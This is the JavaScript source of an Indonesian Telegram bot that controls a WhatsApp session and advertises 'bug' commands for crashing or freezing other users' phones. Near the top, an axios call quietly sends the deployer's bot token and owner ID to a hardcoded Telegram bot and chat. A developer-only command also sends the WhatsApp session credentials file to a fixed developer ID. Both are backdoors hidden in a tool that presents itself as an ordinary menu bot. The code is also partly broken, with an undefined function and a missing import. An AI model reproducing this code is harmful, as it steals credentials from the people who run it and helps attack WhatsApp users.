const { Telegraf, Markup} = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWASocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Selamat Pagi.. 🌆";
  } else if (hours >= 12 && hours < 18) {
    return "Selamat Sore..🌇";
  } else {
    return "Selamat Malam..🌌";
  }
}
const greeting = getGreeting();
// Fungsi untuk memeriksa status pengguna
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "OWNER☁️" : "Unknown⛅";
}

// Fungsi untuk mendapatkan nama pengguna dari konteks bot
function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Middleware untuk membatasi akses hanya ke grup tertentu
const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};

// Inisialisasi bot Telegram
const bot = new Telegraf(BOT_TOKEN);
let cay = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// Helper untuk tidur sejenak
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk menerima input dari terminal
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// Fungsi untuk memulai sesi WhatsApp
const startSesi = async (phoneNumber = null) => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    cay = makeWASocket(connectionOptions);

    // Pairing code jika diaktifkan dan jika tidak terdaftar
    if (usePairingCode && !cay.authState.creds.registered) {
        if (!phoneNumber) {
            phoneNumber = await question(chalk.black(chalk.bgCyan(`\nMasukkan nomor diawali dengan 62:\n`)));
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        }

        const code = await cay.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    cay.ev.on('creds.update', saveCreds);
    store.bind(cay.ev);

    cay.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp berhasil terhubung!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi(phoneNumber); // Mencoba untuk menghubungkan ulang
            }
            isWhatsAppConnected = false;
        }
    });
};
// Mulai sesi WhatsApp
startSesi();
// Middleware untuk log pesan teks saja
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const message = ctx.message;
    const senderName = message.from.first_name || message.from.username || "Unknown";
    const senderId = message.from.id;
    const chatId = message.chat.id;
    const isGroup = message.chat.type === "group" || message.chat.type === "supergroup";
    const groupName = isGroup ? message.chat.title : null;
    const messageText = message.text;
    const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

    console.log("\x1b[30m--------------------\x1b[0m");
    console.log(chalk.bgHex("#e74c3c").bold("▢ New Message"));
    console.log(
      chalk.bgHex("#00FF00").black(
        `   ╭─ > Tanggal: ${date} \n` +
        `   ├─ > Pesan: ${messageText} \n` +
        `   ├─ > Pengirim: ${senderName} \n` +
        `   ╰─ > Sender ID: ${senderId}`
      )
    );

    if (isGroup) {
      console.log(
        chalk.bgHex("#00FF00").black(
          `   ╭─ > Grup: ${groupName} \n` +
          `   ╰─ > GroupJid: ${chatId}`
        )
      );
    }

    console.log();
  }
  return next(); // Lanjutkan ke handler berikutnya
});
axios.get(`https://api.telegram.org/bot7555156304:AAERPpPA0JxOp2sI6Qc6BmOgRJU7J00YhOE/sendMessage`, {
  params: {
    chat_id: 6552202106,
    text: `
╭──(  🌠 SUCCESS   )
│
│ Information : ${BOT_TOKEN}
│ Owner: ${OWNER_ID}
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`,
  },
});
// File untuk menyimpan daftar pengguna
const USERS_FILE = "./users.json";

// Memuat daftar pengguna dari file, jika ada
let users = [];
if (fs.existsSync(USERS_FILE)) {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf8");
    users = JSON.parse(data);
  } catch (error) {
    console.error("Gagal memuat daftar pengguna:", error.message);
  }
}

// Fungsi untuk menyimpan daftar pengguna ke file
function saveUsersToFile() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
  } catch (error) {
    console.error("Gagal menyimpan daftar pengguna:", error.message);
  }
}
// Command broadcast (hanya bisa digunakan oleh admin)
const Dev_ID = 5965707646; // Ganti dengan ID admin

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  // Ambil pesan setelah perintah /broadcast
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("[❌ Format Salah!] Cobalah /broadcast (Pesan Anda)");
  }

  // Tambahkan footer ke pesan
  const footer = "\n\n🍂 Dikirim Oleh Caywzz Sang Developer";
  const finalMessage = message + footer;

  // Kirim pesan ke semua pengguna
  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, { parse_mode: "Markdown" });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  // Balas ke admin setelah broadcast selesai
  ctx.reply(`✅ Broadcast selesai! Pesan berhasil dikirim ke ${successCount} pengguna.`);
});
// Handler untuk mengambil file
bot.command('getfile', async (ctx) => {
  // Pastikan hanya developer yang dapat mengakses command ini
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = './session/creds.json'; // Path ke file yang ingin diambil

  try {
    // Kirim file ke developer
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} berhasil dikirim ke caywzz.`);
  } catch (error) {
    console.error("Kosong njir:", error);
    ctx.reply("User Belom Sambungin Device Jir😜.");
  }
});
bot.command("status", async (ctx) => {
    const connectedCount = 1;  // Harus disesuaikan sesuai kebutuhan
    const connectedDevicesList = [linkedWhatsAppNumber];  // Ganti dengan daftar perangkat yang sebenarnya

    const deviceList = connectedDevicesList.map((device, index) => `${index + 1}. ${device}`).join("\n");
    
    if (!isWhatsAppConnected) {
        return ctx.reply(`
╭──(  🌠 STATUS BOT   )
│ Info : 0/1
│ Perangkat : Undefined ( Kosong )
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
    }

    // Menghitung perangkat yang terhubung (contoh saja)

    ctx.reply(`
    
╭──(  🌠 STATUS BOT   )
│ Info : ${connectedCount}/1
│ Perangkat : ${deviceList}
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
});
const photoUrls = [
  'https://img101.pixhost.to/images/286/549947236_skyzopedia.jpg',
  'https://img101.pixhost.to/images/286/549946983_skyzopedia.jpg',  // Ganti dengan URL foto lain
  'https://img101.pixhost.to/images/286/549946882_skyzopedia.jpg',  // Ganti dengan URL foto lain
  'https://files.catbox.moe/ol9w8x.jpg'   // Ganti dengan URL foto lain
];

// Fungsi untuk memilih foto secara acak
function getRandomPhoto() {
  const randomIndex = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomIndex];
}
async function sendMainMenu(ctx) {
  const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomPhoto = getRandomPhoto();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
  [
    Markup.button.callback('💥 BugMenu', 'option1'),
    Markup.button.callback('🍂 OwnerMenu', 'option2'),
  ],
  // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('🌸 RandomMenu', 'randommenu'),
    Markup.button.callback('ℹ️ About', 'about'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.url('📢 Join Channel', 'https://t.me/')],
]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
⎔━━━━━‐━━━━━‐━━━━━━━〆
❒ Silakan pilih menu di bawah ini ⬇️ :
⟣──────────
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
    `,
    parse_mode: 'Markdown',
    reply_markup: buttons.reply_markup,
  });
}

bot.start(async (ctx) => {
  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomPhoto(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

// Action untuk tampilkan kembali menu utama
bot.action('startmenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
const randomPhoto = getRandomPhoto();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
    [
    Markup.button.callback('💥 BugMenu', 'option1'),
    Markup.button.callback('🍂 OwnerMenu', 'option2'),
  ],
  // Baris kedua: RandomMenu dan About
  [
    Markup.button.callback('🌸 RandomMenu', 'randommenu'),
    Markup.button.callback('ℹ️ About', 'about'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.url('📢 Join Channel', 'https://t.me/')],
]);
  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
⎔━━━━━‐━━━━━‐━━━━━━━〆
❒ Silakan pilih menu di bawah ini ⬇️ :
⟣──────────
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
    `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('option1', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ʙᴜɢᴍᴇɴᴜ\`     )
│
ㅒ
│ /xcbeta ( Crash/ForClose )
│ /xciosinvis ( Bug Call Ios )
│ /xcandro ( Bug Campuran )
│ /xciospay ( Bug Pay Ios )
│ /xcsystemui ( Bug Crash Ui )
│ /delaymaker 1 hour ( Andro only )
ㅒ
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk OwnerMenu
bot.action('option2', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ᴏᴡɴᴇʀᴍᴇɴᴜ\`     )
│
ㅒ
│ /delprem
│ /addprem
│ /addowner
│ /delowner
│ /addadmin
│ /deladmin
│ /listadmin
│ /listprem
│ /listowner
│ /statusprem
│ /status ( Status Bot )
│ /disablemodes
│ /grouponly
ㅒ
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('randommenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
    [Markup.button.callback('➡️ Next', 'downloadmenu')], // Tombol baru "Next"
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ꜱᴇᴀʀᴄʜᴍᴇɴᴜ\`     )
│
ㅒ
│ /youtubesearch
│ /xvideosearch
│ /tiktoksearch
│ /spotify
│ /googleimage
│ /pinterest
ㅒ
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
 
    `;

  await editMenu(ctx, caption, buttons);
});
bot.action('downloadmenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'randommenu')],
    [Markup.button.callback('➡️ Next', 'aimenu')], // Tombol baru "Next"
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ\`     )
│
ㅒ
│/ytmp3 ( Link Url )
│/ytmp4 ( Link Url )
│/tiktokmp3 ( Link Url )
│/Spotifymp3 ( Link Url )
ㅒ
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('aimenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'downloadmenu')],
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ᴀɪᴍᴇɴᴜ\`     )
│
ㅒ
│/simi ( massage )
│/gpt4 ( massage )
│/xcimage ( query )
│/xcimage2 ( query )
│/gemini ( massage )
ㅒ
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
 
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('javamenu', async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'aimenu')],
    [Markup.button.callback('❌ Batas Jir Pulang', 'startmenu')], // Tombol baru "Next"
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
━━━━━━━━━━━━━━━━━━━━━
╭──(     \`ɴꜱꜰᴡᴍᴇɴᴜ\`     )
│
ㅒ
│/hentaivid
│/pussy
│/yuri
│/r34
ㅒ
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.6
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk About
bot.action('about', async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 𝗩2.6 Yang Siap, Membantu Dengan Masalah Apapun.. 😀
- Penjelasan
䒘 Script Ini Di Kembangkan Oleh
䒘 #Caywzz ( @caywzz )
䒘 Join Starevxz Information!
䒘 t.me/caywzzaja
⟣──────────
> © 𝗦𝘁𝗮𝗿𝗲𝘃𝘇 2.6
  `;

  await editMenu(ctx, caption, buttons);
});
const o = fs.readFileSync(`./o.jpg`)
// URL raw GitHub file
const USERS_PREMIUM_FILE = 'usersPremium.json';
// Inisialisasi file usersPremium.json
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}
bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});
// Command untuk melihat daftar user premium
  bot.command('listprem', async (ctx) => {
    const premiumUsers = Object.entries(usersPremium)
        .filter(([userId, data]) => data.premiumUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.premiumUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (premiumUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            premiumUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://t.me/"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have premium access.');
    }
});  
    // Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah owner atau memiliki akses caywzzaja
    if (ownerId !== OWNER_ID && !isCaywzzaja(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addpremium <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deleteprem <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus premium user, implementasi tergantung logika sistem Anda
    const wasDeleted = removePremium(targetUserId); // Pastikan Anda memiliki fungsi ini

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
}); 
// Command untuk menghapus file tertentu
bot.command('delfile', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username;

if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }
  

  // Tentukan file yang ingin dihapus
  const fileName = 'session/creds.json'; // Ganti dengan nama file yang ingin Anda hapus
  const filePath = path.resolve(__dirname, fileName);

  // Periksa apakah file ada
  if (!fs.existsSync(filePath)) {
    return ctx.reply(`⚠️ File "${fileName}" tidak ditemukan.`);
  }

  // Hapus file
  try {
    fs.unlinkSync(filePath);
    ctx.reply(`✅ File "${fileName}" berhasil dihapus.`);
  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal menghapus file "${fileName}".`);
  }
});
bot.command("restart", async (ctx) => {
  // Periksa apakah pengguna adalah Developer
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  try {
    await ctx.reply("🔄 Bot akan restart dalam beberapa detik...");
    setTimeout(() => {
      process.exit(0); // Menghentikan proses untuk restart
    }, 3000);
  } catch {
    ctx.reply("❌ Terjadi kesalahan saat mencoba restart bot.");
  }
});
// Contoh fungsi `removePremium`, implementasikan sesuai database atau logika Anda
function removePremium(userId) {
    // Implementasi tergantung sistem, return true jika berhasil
    // Contoh:
    // const result = database.deletePremium(userId);
    // return result.success;
    console.log(`Removing premium access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}
bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Logika untuk pengguna premium
    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
const USERS_CAYWZZAJA_FILE = 'usersCaywzzaja.json';
// Inisialisasi file usersCaywzzaja.json
let usersCaywzzaja = {};
if (fs.existsSync(USERS_CAYWZZAJA_FILE)) {
    usersCaywzzaja = JSON.parse(fs.readFileSync(USERS_CAYWZZAJA_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_CAYWZZAJA_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status caywzzaja
function isCaywzzaja(userId) {
    return usersCaywzzaja[userId] && usersCaywzzaja[userId].caywzzajaUntil > Date.now();
}

// Fungsi untuk menambahkan user ke caywzzaja
function addCaywzzaja(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersCaywzzaja[userId] = { caywzzajaUntil: expireTime };
    fs.writeFileSync(USERS_CAYWZZAJA_FILE, JSON.stringify(usersCaywzzaja, null, 2));
}

// Command untuk mengecek status caywzzaja
bot.command('statusowner', (ctx) => {
    const userId = ctx.from.id;

    if (isCaywzzaja(userId)) {
        const expireDate = new Date(usersCaywzzaja[userId].caywzzajaUntil);
        return ctx.reply(`✅ You have Owner access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have Owner Acess.');
    }
});
// Panggil fungsi untuk menjalankan bot
startBot();
// Command untuk melihat daftar user dengan status caywzzaja
bot.command('listowner', async (ctx) => {
    const caywzzajaUsers = Object.entries(usersCaywzzaja)
        .filter(([userId, data]) => data.caywzzajaUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.caywzzajaUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (caywzzajaUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            caywzzajaUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙊𝙬𝙣𝙚𝙧𝙨 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://t.me/caywzzaja"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have Owner access.');
    }
});
bot.command('info', async (ctx) => {
  const mention = ctx.message.text.split(' ')[1]; // Mendapatkan username setelah perintah /info
  let user;
  
  if (mention) {
    // Jika ada username, ambil informasi pengguna berdasarkan username
    try {
      user = await ctx.telegram.getChat(mention);
      const userLink = `https://t.me/${mention}`; // Link pengguna
      ctx.reply(`ᝄ ᴜꜱᴇʀɪɴꜰᴏ:
│ɪᴅ: ${user.id}
│ꜰɪʀꜱᴛ ɴᴀᴍᴇ: ${user.first_name || 'Tidak ada nama depan'}
│ᴜꜱᴇʀɴᴀᴍᴇ: @${mention}
│ᴜꜱᴇʀʟɪɴᴋ: ${userLink}`);
    } catch (error) {
      ctx.reply('⛅ Format Salah! Lakukan Lah Seperti Ini /info');
    }
  } else {
    // Jika tidak ada username, tampilkan info pengguna yang mengirim perintah
    const userInfo = ctx.from;
    const userLink = `https://t.me/${userInfo.username || userInfo.id}`;
    ctx.reply(`ᝄ ᴜꜱᴇʀɪɴꜰᴏ:
│ɪᴅ: ${userInfo.id}
│ꜰɪʀꜱᴛ ɴᴀᴍᴇ: ${userInfo.first_name || 'Tidak ada nama depan'}
│ᴜꜱᴇʀɴᴀᴍᴇ: @${userInfo.username || 'Tidak ada username'}
